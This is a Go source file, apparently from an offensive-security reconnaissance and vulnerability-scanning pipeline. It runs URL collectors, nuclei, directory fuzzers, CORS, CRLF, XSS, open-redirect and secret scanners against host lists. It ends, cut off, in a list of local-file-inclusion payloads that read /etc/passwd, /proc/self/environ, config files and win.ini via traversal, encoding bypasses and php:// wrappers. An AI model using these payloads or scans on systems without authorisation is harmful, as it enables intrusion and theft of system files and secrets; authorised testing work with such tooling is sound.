// ─── ParameterDiscovery ───────────────────────────────────────────────────────

func discoverParams(outputFile string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "params-arjun.txt")

	if !fileExistsNonEmpty(hostsFile) {
		logInfo(skyBlue("(-) No alive hosts for parameter discovery, skipping"))
		return
	}
	if !toolInPath("arjun") {
		logWarn(red("(-) arjun not found in PATH (optional)"))
		return
	}
	logInfo(green("(+) Discovering hidden parameters with arjun"))
	_, _, err := run(20*time.Minute, "arjun", "-i", hostsFile, "-oT", out, "--stable")
	if err != nil {
		logWarn(red("(-) arjun: " + err.Error()))
		return
	}
	if fileExistsNonEmpty(out) {
		logInfo(green(fmt.Sprintf("(+) Found %d parameter(s) → %s", countLines(out), out)))
	} else {
		logInfo(skyBlue("(-) No hidden parameters found"))
	}
}

// ─── UrlFinder ────────────────────────────────────────────────────────────────

// cleanDomains builds a deduplicated list of bare hostnames from the user's
// original domains file and the alive-hosts.txt, adding apex variants
// (strips leading "www.") so wayback/gau find archives at the root domain.
func cleanDomains(domainsFile, subdomainsFile string) []byte {
	seen := make(map[string]bool)
	var out []string

	var add func(host string)
	add = func(host string) {
		host = strings.ToLower(strings.TrimSpace(strings.SplitN(host, "/", 2)[0]))
		if host == "" || seen[host] {
			return
		}
		seen[host] = true
		out = append(out, host)
		if strings.HasPrefix(host, "www.") {
			add(host[4:])
		}
	}

	readHostsFile := func(path string) {
		lines, err := readLines(path)
		if err != nil {
			return
		}
		for _, line := range lines {
			tok := strings.Fields(line)
			if len(tok) == 0 {
				continue
			}
			u, err := url.Parse(tok[0])
			if err != nil || u.Host == "" {
				add(tok[0])
			} else {
				add(u.Host)
			}
		}
	}

	readHostsFile(domainsFile)
	readHostsFile(subdomainsFile)

	if len(out) == 0 {
		return nil
	}
	return []byte(strings.Join(out, "\n") + "\n")
}

func filterURLsByRegex(urlsFile string, patternStr string, destFile string) {
	if !fileExistsNonEmpty(urlsFile) {
		return
	}
	re, err := regexp.Compile(patternStr)
	if err != nil {
		return
	}

	f, err := os.Open(urlsFile)
	if err != nil {
		return
	}
	defer f.Close()

	seen := make(map[string]bool)
	var unique []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		if re.MatchString(line) {
			// strip query string for doc/js collection
			stripped := strings.SplitN(line, "?", 2)[0]
			stripped = strings.TrimSpace(stripped)
			if stripped != "" && !seen[stripped] {
				seen[stripped] = true
				unique = append(unique, stripped)
			}
		}
	}
	sort.Strings(unique)
	if len(unique) == 0 {
		return
	}
	runAnew(destFile, []byte(strings.Join(unique, "\n")+"\n"))
}

type urlCollectResult struct {
	dest string
	data []byte
}

func collectURLs(domainsFile, outputFile string) {
	subdomainsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	allURLs := filepath.Join(outputFile, "urls", "all-urls.txt")
	paramsOut := filepath.Join(outputFile, "urls", "params.txt")

	// katana
	logInfo(green("(+) Collecting all URLs (katana)"))
	if err := runInherit(30*time.Minute, "katana",
		"-list", subdomainsFile,
		"-d", "5",
		"-jc",
		"-fx",
		"-o", allURLs,
	); err != nil {
		logWarn(red("(-) katana: " + err.Error()))
	}

	if !fileExistsNonEmpty(subdomainsFile) {
		logWarn(red("(-) alive-hosts file missing or empty, skipping passive URL collection"))
	} else {
		logInfo(green("(+) Collecting URLs in parallel (waybackurls, gau, waymore, paramspider)"))
		domInput := cleanDomains(domainsFile, subdomainsFile)

		results := make(chan urlCollectResult, 4)
		var wg sync.WaitGroup

		// waybackurls
		wg.Add(1)
		go func() {
			defer wg.Done()
			if !toolInPath("waybackurls") {
				logWarn(red("(-) waybackurls not found in PATH"))
				results <- urlCollectResult{"urls", nil}
				return
			}
			if len(domInput) == 0 {
				results <- urlCollectResult{"urls", nil}
				return
			}
			stdout, stderr, err := runWithStdin(10*time.Minute, domInput, "waybackurls")
			if err != nil {
				logWarn("waybackurls: " + err.Error())
				if len(stderr) > 0 {
					logDebug("waybackurls stderr: " + string(stderr))
				}
			}
			results <- urlCollectResult{"urls", bytes.TrimSpace(stdout)}
		}()

		// gau
		wg.Add(1)
		go func() {
			defer wg.Done()
			if !toolInPath("gau") {
				logWarn(red("(-) gau not found in PATH"))
				results <- urlCollectResult{"urls", nil}
				return
			}
			if len(domInput) == 0 {
				results <- urlCollectResult{"urls", nil}
				return
			}
			stdout, stderr, err := runWithStdin(10*time.Minute, domInput, "gau", "--subs")
			if err != nil {
				logWarn("gau: " + err.Error())
				if len(stderr) > 0 {
					logDebug("gau stderr: " + string(stderr))
				}
			}
			results <- urlCollectResult{"urls", bytes.TrimSpace(stdout)}
		}()

		// waymore
		wg.Add(1)
		go func() {
			defer wg.Done()
			if !toolInPath("waymore") {
				results <- urlCollectResult{"urls", nil}
				return
			}
			logInfo(green("(+) Running waymore for URL collection"))
			hosts, err := readLines(subdomainsFile)
			if err != nil {
				results <- urlCollectResult{"urls", nil}
				return
			}
			var collected []byte
			deadline := time.Now().Add(30 * time.Minute)
			for _, host := range hosts {
				if time.Now().After(deadline) {
					logWarn("waymore global timeout reached, stopping early")
					break
				}
				u, err := url.Parse(host)
				domain := host
				if err == nil && u.Host != "" {
					domain = u.Host
				}
				tmp, err := os.CreateTemp("", "waymore-*.txt")
				if err != nil {
					continue
				}
				tmp.Close()
				_, _, err = run(5*time.Minute, "waymore", "-i", domain, "-mode", "U", "-oU", tmp.Name())
				if err != nil {
					logDebug("waymore timed out for " + domain)
				}
				data, _ := os.ReadFile(tmp.Name())
				collected = append(collected, data...)
				os.Remove(tmp.Name())
			}
			results <- urlCollectResult{"urls", collected}
		}()

		// paramspider
		wg.Add(1)
		go func() {
			defer wg.Done()
			if !toolInPath("paramspider") {
				logWarn(red("(-) paramspider not found in PATH"))
				results <- urlCollectResult{"params", nil}
				return
			}
			logInfo(green("(+) Running paramspider for parameter discovery"))
			tmpDir, err := os.MkdirTemp("", "paramspider-*")
			if err != nil {
				results <- urlCollectResult{"params", nil}
				return
			}
			defer os.RemoveAll(tmpDir)

			cmd := exec.Command("paramspider", "-l", subdomainsFile)
			cmd.Dir = tmpDir
			cmd.Stdout = io.Discard
			cmd.Stderr = io.Discard
			done := make(chan error, 1)
			cmd.Start()
			go func() { done <- cmd.Wait() }()
			select {
			case <-done:
			case <-time.After(10 * time.Minute):
				cmd.Process.Kill()
			}

			var data []byte
			resultsDir := filepath.Join(tmpDir, "results")
			entries, err := os.ReadDir(resultsDir)
			if err == nil {
				for _, e := range entries {
					p := filepath.Join(resultsDir, e.Name())
					b, _ := os.ReadFile(p)
					data = append(data, b...)
				}
			}
			results <- urlCollectResult{"params", data}
		}()

		go func() {
			wg.Wait()
			close(results)
		}()

		for r := range results {
			if len(r.data) == 0 {
				continue
			}
			target := allURLs
			if r.dest == "params" {
				target = paramsOut
			}
			runAnew(target, r.data)
		}
	}

	// gf patterns
	gfPatterns := []string{"xss", "ssrf", "lfi", "sqli", "ssti", "redirect"}
	gfOutputDir := filepath.Join(outputFile, "urls")

	if fileExistsNonEmpty(allURLs) {
		if toolInPath("gf") {
			var wg sync.WaitGroup
			for _, pattern := range gfPatterns {
				pattern := pattern
				wg.Add(1)
				go func() {
					defer wg.Done()
					outFile := filepath.Join(gfOutputDir, "gf-"+pattern+".txt")
					data, err := os.ReadFile(allURLs)
					if err != nil {
						return
					}
					stdout, _, err := runWithStdin(5*time.Minute, data, "gf", pattern)
					if err != nil {
						if !strings.Contains(err.Error(), "exit status") {
							logWarn("gf " + pattern + " failed: " + err.Error())
						}
						return
					}
					if len(bytes.TrimSpace(stdout)) > 0 {
						runAnew(outFile, stdout)
					}
				}()
			}
			wg.Wait()
		} else {
			logWarn(red("gf not found in PATH; install from https://github.com/tomnomnom/gf"))
		}
	}

	// lfi alias
	gfLFI := filepath.Join(gfOutputDir, "gf-lfi.txt")
	lfiURLsOut := filepath.Join(outputFile, "vuln", "lfi-urls.txt")
	lfiSubsOut := filepath.Join(outputFile, "vuln", "lfi-subs.txt")
	if fileExistsNonEmpty(gfLFI) {
		data, err := os.ReadFile(gfLFI)
		if err == nil {
			os.WriteFile(lfiURLsOut, data, 0644)
		}
		seenSubs := make(map[string]bool)
		f, err := os.Create(lfiSubsOut)
		if err == nil {
			defer f.Close()
			lines, _ := readLines(gfLFI)
			for _, line := range lines {
				u, err := url.Parse(line)
				host := line
				if err == nil && u.Host != "" {
					host = u.Scheme + "://" + u.Host
				}
				if !seenSubs[host] {
					seenSubs[host] = true
					f.WriteString(host + "\n")
				}
			}
		}
	}
}

func extractJSFiles(outputFile string) {
	logInfo(green("[+] Extracting JS files..."))
	allURLs := filepath.Join(outputFile, "urls", "all-urls.txt")
	jsOutput := filepath.Join(outputFile, "urls", "js-files.txt")
	if !fileExistsNonEmpty(allURLs) {
		logWarn(red("(-) all-urls.txt missing or empty, skipping JS extraction"))
		return
	}
	filterURLsByRegex(allURLs, `\.(js|json)($|\?)`, jsOutput)
	logInfo(green("[+] Completed: JS files saved to " + jsOutput))
}

func extractDocuments(outputFile string) {
	logInfo(green("[+] Extracting documents and backup files..."))
	allURLs := filepath.Join(outputFile, "urls", "all-urls.txt")
	leakedDocs := filepath.Join(outputFile, "urls", "leaked-docs.txt")
	if !fileExistsNonEmpty(allURLs) {
		logWarn(red("(-) all-urls.txt missing or empty, skipping document extraction"))
		return
	}
	pat := `\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar)($|\?)`
	filterURLsByRegex(allURLs, pat, leakedDocs)
	logInfo(green("[+] Completed: Sensitive documents saved to " + leakedDocs))
}

// shQuote escapes a path for safe inclusion in a bash -c command.
func shQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

func extractJSDataWithMantra(outputFile string) {
	if !toolInPath("mantra") {
		logWarn(red("(-) mantra not found in PATH, skipping"))
		return
	}
	if !toolInPath("anew") {
		logWarn(red("(-) anew not found in PATH, skipping mantra"))
		return
	}
	jsOutput := filepath.Join(outputFile, "urls", "js-files.txt")
	mantraOut := filepath.Join(outputFile, "urls", "mantra_output.txt")

	// mantra is a JS-secrets extractor — feeding it all-urls.txt (15k+ URLs)
	// is 25x slower for the same useful output. Run only on js-files.txt.
	if !fileExistsNonEmpty(jsOutput) {
		logWarn(red("(-) js-files.txt empty, skipping mantra"))
		return
	}
	n := countLines(jsOutput)
	const mantraTimeout = 20 * time.Minute
	logInfo(green(fmt.Sprintf(
		"[+] Mantra: processing %d JS URL(s) (timeout %s, streaming to anew)",
		n, mantraTimeout)))

	// True streaming pipeline: anew writes results progressively, so partial
	// findings survive even if mantra hits the timeout. mantra -s suppresses
	// its ASCII banner and per-URL progress (otherwise written to stdout and
	// captured by anew, polluting the findings file); the sed filter strips
	// the ANSI color codes mantra still emits around each match.
	shellCmd := fmt.Sprintf(
		`cat %s | mantra -s | sed -E 's/\x1b\[[0-9;]*m//g' | anew %s`,
		shQuote(jsOutput), shQuote(mantraOut))

	cmd := exec.Command("bash", "-c", shellCmd)
	cmd.Stdout = io.Discard
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		logWarn(red("(-) mantra failed to start: " + err.Error()))
		return
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case err := <-done:
		if err != nil {
			logDebug("mantra exit: " + err.Error())
		}
	case <-time.After(mantraTimeout):
		_ = cmd.Process.Kill()
		logWarn(red(fmt.Sprintf("(-) mantra hit %s timeout — partial results saved", mantraTimeout)))
	}

	if fileExistsNonEmpty(mantraOut) {
		logInfo(green(fmt.Sprintf("[+] Mantra findings → %s (%d lines)",
			mantraOut, countLines(mantraOut))))
	} else {
		logInfo(skyBlue("(-) Mantra: no findings extracted"))
	}
}

// ─── Nuclei ───────────────────────────────────────────────────────────────────

type NucleiRunner struct {
	outputFile  string
	rateLimit   int
	bulkSize    int
	concurrency int
}

func (n *NucleiRunner) updateTemplates() {
	logInfo(green("(+) Updating nuclei templates"))
	run(2*time.Minute, "nuclei", "-update-templates", "-silent")
}

func (n *NucleiRunner) basicNuclei() {
	hosts := filepath.Join(n.outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(n.outputFile, "vuln", "nuclei-output.txt")

	if !fileExistsNonEmpty(hosts) {
		logWarn(red("(-) No alive hosts file for Nuclei, skipping"))
		return
	}
	n.updateTemplates()
	logInfo(green("(+) Nuclei active scanning"))
	_, stderr, err := run(60*time.Minute, "nuclei",
		"-l", hosts, "-o", out,
		"-severity", "critical,high,medium",
		"-tags", "exposure,misconfiguration,default-login,takeover,cve,exposed-panels,network,token-spray",
		"-retries", "2",
		"-rl", fmt.Sprint(n.rateLimit),
		"-bs", fmt.Sprint(n.bulkSize),
		"-c", fmt.Sprint(n.concurrency),
	)
	if err != nil {
		logWarn(red("(-) nuclei: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("nuclei stderr: " + string(stderr))
		}
	}
}

func (n *NucleiRunner) dastNuclei() {
	urls := filepath.Join(n.outputFile, "urls", "all-urls.txt")
	out := filepath.Join(n.outputFile, "vuln", "nuclei-dast-output.txt")

	if !fileExistsNonEmpty(urls) {
		logWarn(red("(-) No URLs file for Nuclei DAST, skipping"))
		return
	}
	logInfo(green("(+) Nuclei DAST active scanning"))
	data, _ := os.ReadFile(urls)
	_, stderr, err := runWithStdin(60*time.Minute, data, "nuclei", "--dast", "-o", out)
	if err != nil {
		logWarn(red("(-) nuclei DAST: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("nuclei dast stderr: " + string(stderr))
		}
	}
}

// ─── DirFuzzer (ffuf) ─────────────────────────────────────────────────────────

type ffufResult struct {
	Results []struct {
		URL    string `json:"url"`
		Status int    `json:"status"`
		Length int    `json:"length"`
		Words  int    `json:"words"`
		Lines  int    `json:"lines"`
	} `json:"results"`
}

func dirFuzz(outputFile, wordlist string, threads, reqTimeout int, matchCodes string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "ffuf-output.txt")

	if !toolInPath("ffuf") {
		logWarn(red("(-) ffuf not found in PATH, skipping directory fuzzing"))
		return
	}
	if !fileExistsNonEmpty(hostsFile) {
		logWarn(red("(-) No alive hosts file for ffuf, skipping"))
		return
	}

	home, _ := os.UserHomeDir()
	wl := wordlist
	if wl == "" {
		wl = filepath.Join(home, "Tools", "wordlists", "ffuf-common.txt")
	}
	if _, err := os.Stat(wl); err != nil {
		logWarn(red("(-) Wordlist not found: " + wl + ", skipping directory fuzzing"))
		return
	}

	logInfo(green("(+) Directory fuzzing with ffuf (parallel, max 3 hosts)"))
	hosts, _ := readLines(hostsFile)

	var mu sync.Mutex
	var allResults []string
	sem := make(chan struct{}, 3)

	var wg sync.WaitGroup
	for _, host := range hosts {
		host := host
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			targetURL := strings.TrimSuffix(host, "/") + "/FUZZ"
			logInfo(skyBlue("(+) ffuf -> " + host))
			safeName := strings.ReplaceAll(strings.ReplaceAll(host, "://", "_"), "/", "_")
			tmpPath := filepath.Join(outputFile, "vuln", ".ffuf_tmp_"+safeName+".json")
			defer os.Remove(tmpPath)

			_, _, err := run(30*time.Minute, "ffuf",
				"-u", targetURL,
				"-w", wl,
				"-t", fmt.Sprint(threads),
				"-timeout", fmt.Sprint(reqTimeout),
				"-mc", matchCodes,
				"-o", tmpPath,
				"-of", "json",
				"-s",
			)
			if err != nil {
				logDebug("ffuf failed for " + host + ": " + err.Error())
				return
			}
			if !fileExistsNonEmpty(tmpPath) {
				return
			}
			data, err := os.ReadFile(tmpPath)
			if err != nil {
				return
			}
			var result ffufResult
			if err := json.Unmarshal(data, &result); err != nil {
				return
			}
			if len(result.Results) == 0 {
				return
			}
			var lines []string
			lines = append(lines, "# "+host)
			for _, r := range result.Results {
				lines = append(lines, fmt.Sprintf("%s [Status: %d, Size: %d, Words: %d, Lines: %d]",
					r.URL, r.Status, r.Length, r.Words, r.Lines))
			}
			lines = append(lines, "")
			mu.Lock()
			allResults = append(allResults, lines...)
			mu.Unlock()
		}()
	}
	wg.Wait()

	os.WriteFile(out, []byte(strings.Join(allResults, "\n")+"\n"), 0644)
	logInfo(green("(+) Directory fuzzing completed, results saved to " + out))
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── CorsScanner ──────────────────────────────────────────────────────────────

func corsScan(outputFile string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "cors.txt")

	if !fileExistsNonEmpty(hostsFile) {
		logWarn(red("(-) No alive hosts for CORS scan, skipping"))
		return
	}
	if !toolInPath("corsy") {
		logWarn(red("(-) corsy not found in PATH, skipping CORS scan"))
		return
	}
	logInfo(green("(+) Running CORS misconfiguration scan"))
	_, stderr, err := run(30*time.Minute, "corsy", "-i", hostsFile, "-o", out)
	if err != nil {
		logWarn(red("(-) CORS scan: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("corsy stderr: " + string(stderr))
		}
		return
	}
	logInfo(green("(+) CORS scan completed, results saved to " + out))
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── CrlfScanner ──────────────────────────────────────────────────────────────

func crlfScan(outputFile string) {
	urlsFile := filepath.Join(outputFile, "urls", "all-urls.txt")
	out := filepath.Join(outputFile, "vuln", "crlf.txt")

	if !fileExistsNonEmpty(urlsFile) {
		logWarn(red("(-) No URLs for CRLF scan, skipping"))
		return
	}
	if !toolInPath("crlfuzz") {
		logWarn(red("(-) crlfuzz not found in PATH, skipping CRLF scan"))
		return
	}
	logInfo(green("(+) Running CRLF injection scan"))
	_, stderr, err := run(30*time.Minute, "crlfuzz", "-l", urlsFile, "-o", out)
	if err != nil {
		logWarn(red("(-) CRLF scan: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("crlfuzz stderr: " + string(stderr))
		}
		return
	}
	logInfo(green("(+) CRLF scan completed, results saved to " + out))
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── DirectoryFuzzer (dirsearch) ──────────────────────────────────────────────

func dirsearchScan(outputFile, wordlist string, threads int, extensions string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "dirsearch-output.txt")

	if !toolInPath("dirsearch") {
		logWarn(red("(-) dirsearch not found in PATH, skipping"))
		return
	}
	if !fileExistsNonEmpty(hostsFile) {
		logWarn(red("(-) No alive hosts for dirsearch, skipping"))
		return
	}
	logInfo(green("(+) Directory discovery with dirsearch"))

	args := []string{
		"-l", hostsFile,
		"-t", fmt.Sprint(threads),
		"-e", extensions,
		"--format", "plain",
		"-o", out,
	}
	if wordlist != "" {
		if _, err := os.Stat(wordlist); err == nil {
			args = append(args, "-w", wordlist)
		}
	}
	_, stderr, err := run(60*time.Minute, "dirsearch", args...)
	if err != nil {
		logWarn(red("(-) dirsearch: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("dirsearch stderr: " + string(stderr))
		}
		return
	}
	logInfo(green("(+) dirsearch completed, results saved to " + out))
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── FourOhThreeBypasser ─────────────────────────────────────────────────────

func bypass403(outputFile string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "403-bypass.txt")

	if !toolInPath("bypass-403") {
		logWarn(red("(-) bypass-403 not found in PATH, skipping 403 bypass"))
		return
	}
	if !fileExistsNonEmpty(hostsFile) {
		logWarn(red("(-) No alive hosts for 403 bypass, skipping"))
		return
	}
	logInfo(green("(+) Running 403 bypass checks"))
	hosts, _ := readLines(hostsFile)

	var results []string
	for _, host := range hosts {
		logInfo(skyBlue("(+) bypass-403 -> " + host))
		stdout, _, err := run(2*time.Minute, "bypass-403", host, "/")
		if err != nil {
			logDebug("bypass-403 timed out for " + host)
			continue
		}
		if len(bytes.TrimSpace(stdout)) > 0 {
			results = append(results, "# "+host+"\n"+string(stdout)+"\n")
		}
	}
	if len(results) > 0 {
		os.WriteFile(out, []byte(strings.Join(results, "")), 0644)
	}
	logInfo(green("(+) 403 bypass completed, results saved to " + out))
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── ApiDiscovery ─────────────────────────────────────────────────────────────

func apiDiscover(outputFile, wordlist string) {
	hostsFile := filepath.Join(outputFile, "hosts", "alive-hosts.txt")
	out := filepath.Join(outputFile, "vuln", "api-endpoints.txt")

	if !fileExistsNonEmpty(hostsFile) {
		logWarn(red("(-) No alive hosts for API discovery, skipping"))
		return
	}

	if toolInPath("kr") {
		logInfo(green("(+) Running API discovery with kiterunner"))
		args := []string{"scan", hostsFile}
		if wordlist != "" {
			if _, err := os.Stat(wordlist); err == nil {
				args = append(args, "-w", wordlist)
			}
		} else {
			args = append(args, "-A=apiroutes-210228:20000")
		}
		stdout, stderr, err := run(30*time.Minute, "kr", args...)
		if err != nil {
			logWarn(red("(-) kiterunner: " + err.Error()))
			if len(stderr) > 0 {
				logDebug("kr stderr: " + string(stderr))
			}
		} else if len(bytes.TrimSpace(stdout)) > 0 {
			os.WriteFile(out, stdout, 0644)
			logInfo(green("(+) API discovery completed, results saved to " + out))
		}
	} else if toolInPath("ffuf") {
		logInfo(green("(+) Running API discovery with ffuf"))
		home, _ := os.UserHomeDir()
		apiWordlist := wordlist
		if apiWordlist == "" {
			apiWordlist = filepath.Join(home, "Tools", "wordlists", "api-endpoints.txt")
		}
		if _, err := os.Stat(apiWordlist); err != nil {
			logWarn(red("(-) No API wordlist found for ffuf, skipping API discovery"))
			return
		}
		hosts, _ := readLines(hostsFile)
		outF, err := os.Create(out)
		if err != nil {
			return
		}
		defer outF.Close()
		for _, host := range hosts {
			targetURL := strings.TrimSuffix(host, "/") + "/FUZZ"
			safeName := strings.ReplaceAll(strings.ReplaceAll(host, "://", "_"), "/", "_")
			tmpPath := filepath.Join(outputFile, "vuln", ".api_ffuf_tmp_"+safeName+".json")
			run(10*time.Minute, "ffuf",
				"-u", targetURL,
				"-w", apiWordlist,
				"-mc", "200,201,204,301,302,401,403,405",
				"-o", tmpPath, "-of", "json", "-s",
			)
			if fileExistsNonEmpty(tmpPath) {
				data, _ := os.ReadFile(tmpPath)
				var result ffufResult
				if json.Unmarshal(data, &result) == nil && len(result.Results) > 0 {
					outF.WriteString("# " + host + "\n")
					for _, r := range result.Results {
						outF.WriteString(fmt.Sprintf("%s [Status: %d, Size: %d]\n", r.URL, r.Status, r.Length))
					}
					outF.WriteString("\n")
				}
				os.Remove(tmpPath)
			}
		}
		logInfo(green("(+) API discovery completed, results saved to " + out))
	} else {
		logWarn(red("(-) Neither kr nor ffuf found in PATH, skipping API discovery"))
		return
	}
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── DalfoxScanner ───────────────────────────────────────────────────────────

func dalfoxScan(outputFile string) {
	xssParams := filepath.Join(outputFile, "urls", "gf-xss.txt")
	out := filepath.Join(outputFile, "vuln", "dalfox-xss.txt")

	if !toolInPath("dalfox") {
		logWarn(red("(-) dalfox not found in PATH, skipping XSS testing"))
		return
	}
	if !fileExistsNonEmpty(xssParams) {
		logWarn(red("(-) No gf-xss.txt for dalfox, skipping"))
		return
	}
	logInfo(green("(+) Testing XSS parameters with dalfox"))
	_, stderr, err := run(60*time.Minute, "dalfox", "file", xssParams, "--skip-bav", "-o", out)
	if err != nil {
		logWarn(red("(-) dalfox: " + err.Error()))
		if len(stderr) > 0 {
			logDebug("dalfox stderr: " + string(stderr))
		}
	}
	if fileExistsNonEmpty(out) {
		logInfo(red(fmt.Sprintf("[!] dalfox: %d XSS finding(s) → %s", countLines(out), out)))
	} else {
		logInfo(green("(+) dalfox: no XSS confirmed"))
	}
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── OpenRedirectScanner ─────────────────────────────────────────────────────

func openRedirectScan(outputFile string) {
	redirectParams := filepath.Join(outputFile, "urls", "gf-redirect.txt")
	allURLs := filepath.Join(outputFile, "urls", "all-urls.txt")
	out := filepath.Join(outputFile, "vuln", "open-redirects.txt")

	src := ""
	if fileExistsNonEmpty(redirectParams) {
		src = redirectParams
	} else if fileExistsNonEmpty(allURLs) {
		src = allURLs
	}

	if !toolInPath("openredirex") {
		logWarn(red("(-) openredirex not found in PATH, skipping open redirect testing"))
		return
	}
	if src == "" {
		logWarn(red("(-) No URL file for openredirex, skipping"))
		return
	}
	logInfo(green("(+) Testing open redirects with openredirex"))
	stdout, _, err := run(30*time.Minute, "openredirex", "-l", src)
	if err != nil {
		logWarn(red("(-) openredirex: " + err.Error()))
		return
	}
	if len(bytes.TrimSpace(stdout)) > 0 {
		os.WriteFile(out, stdout, 0644)
		hits := 0
		for _, l := range strings.Split(string(stdout), "\n") {
			if strings.TrimSpace(l) != "" {
				hits++
			}
		}
		logInfo(red(fmt.Sprintf("[!] openredirex: %d open redirect(s) → %s", hits, out)))
	} else {
		logInfo(green("(+) openredirex: no open redirects found"))
	}
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

// ─── SecretScanner ───────────────────────────────────────────────────────────

func secretfinderScan(outputFile string) {
	jsFile := filepath.Join(outputFile, "urls", "js-files.txt")
	out := filepath.Join(outputFile, "vuln", "secrets.txt")

	if !toolInPath("secretfinder") {
		logWarn(red("(-) secretfinder not found in PATH, skipping"))
		return
	}
	if !fileExistsNonEmpty(jsFile) {
		logWarn(red("(-) No js-files.txt for secretfinder, skipping"))
		return
	}
	logInfo(green("(+) Running secretfinder on JS files (parallel)"))
	jsURLs, _ := readLines(jsFile)

	var mu sync.Mutex
	var findings []string
	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup

	for _, u := range jsURLs {
		u := u
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			stdout, _, err := run(30*time.Second, "secretfinder", "-i", u, "-o", "cli")
			if err != nil {
				logDebug("secretfinder timed out for " + u)
				return
			}
			if len(bytes.TrimSpace(stdout)) > 0 {
				mu.Lock()
				findings = append(findings, "# "+u+"\n"+string(stdout)+"\n")
				mu.Unlock()
			}
		}()
	}
	wg.Wait()

	if len(findings) > 0 {
		os.WriteFile(out, []byte(strings.Join(findings, "")), 0644)
		logInfo(red(fmt.Sprintf("[!] secretfinder: %d JS file(s) with secrets → %s", len(findings), out)))
	} else {
		logInfo(green("(+) secretfinder: no secrets found in JS files"))
	}
	fmt.Println("\n" + skyBlue(strings.Repeat("=", 40)) + "\n")
}

func trufflehogScan(outputFile string) {
	out := filepath.Join(outputFile, "vuln", "trufflehog.txt")

	if !toolInPath("trufflehog") {
		logWarn(red("(-) trufflehog not found in PATH, skipping"))
		return
	}
	logInfo(green("(+) Running trufflehog on scan results directory"))
	stdout, _, err := run(10*time.Minute, "trufflehog", "filesystem", outputFile, "--json", "--no-update")
	if err != nil {
		logWarn(red("(-) trufflehog: " + err.Error()))
		return
	}
	if len(bytes.TrimSpace(stdout)) > 0 {
		os.WriteFile(out, stdout, 0644)
		hits := 0
		for _, l := range strings.Split(string(stdout), "\n") {
			if strings.TrimSpace(l) != "" {
				hits++
			}
		}
		logInfo(red(fmt.Sprintf("[!] trufflehog: %d secret(s) found → %s", hits, out)))
	} else {
		logInfo(green("(+) trufflehog: no secrets found"))
	}
}

// ─── LFIScanner ───────────────────────────────────────────────────────────────

// Param names commonly associated with file-include sinks. Matches gf-lfi
// upstream filtering — used to target injection only at suspect params.
var lfiSuspectParams = map[string]bool{
	"file": true, "files": true, "filename": true, "filepath": true,
	"page": true, "pages": true, "pg": true,
	"path": true, "dir": true, "folder": true, "location": true,
	"template": true, "tpl": true, "theme": true, "style": true,
	"include": true, "inc": true, "require": true,
	"view": true, "show": true, "display": true, "render": true,
	"doc": true, "document": true, "pdf": true, "txt": true,
	"load": true, "read": true, "fetch": true, "get": true,
	"img": true, "image": true, "photo": true, "avatar": true, "icon": true,
	"cat": true, "type": true, "lang": true, "locale": true,
	"src": true, "source": true, "url": true, "uri": true,
	"name": true, "module": true, "action": true,
}

var lfiPayloads = []string{
	// Classic traversal (depth variants)
	"../../../../etc/passwd",
	"../../../etc/passwd",
	"../../etc/passwd",
	"../../../../../etc/passwd",
	// URL-encoded
	"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	// Double-encoded
	"..%252F..%252F..%252Fetc%252Fpasswd",
	// Null-byte (legacy PHP)
	"../../../../etc/passwd%00",
	"../../../../etc/passwd%00.jpg",
	// Filter bypasses
	"....//....//....//etc/passwd",
	"....\\/....\\/etc/passwd",
	"..//..//..//etc/passwd",
	"..;/..;/..;/etc/passwd",
	// UTF-8 / Unicode overlong
	"..%c0%af..%c0%afetc/passwd",
	"%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd",
	// Absolute paths
	"/etc/passwd",
	"file:///etc/passwd",
	// PHP wrappers (source disclosure)
	"php://filter/convert.base64-encode/resource=/etc/passwd",
	"php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
	"php://filter/convert.base64-encode/resource=index.php",
	"php://filter/convert.base64-encode/resource=../index.php",
	"php://filter/convert.base64-encode/resource=../../config.php",
	"expect://id",
	// Windows
	`..\..\..\..\windows\win.ini`,
	`..%5C..%5C..%5Cwindows%5Cwin.ini`,
	"C:/windows/win.ini",
	`C:\windows\win.ini`,
	// /proc & /etc variants
	"../../../../proc/self/environ",
	"../../../../proc/self/cmdline",
	"../../../../proc/self/status",
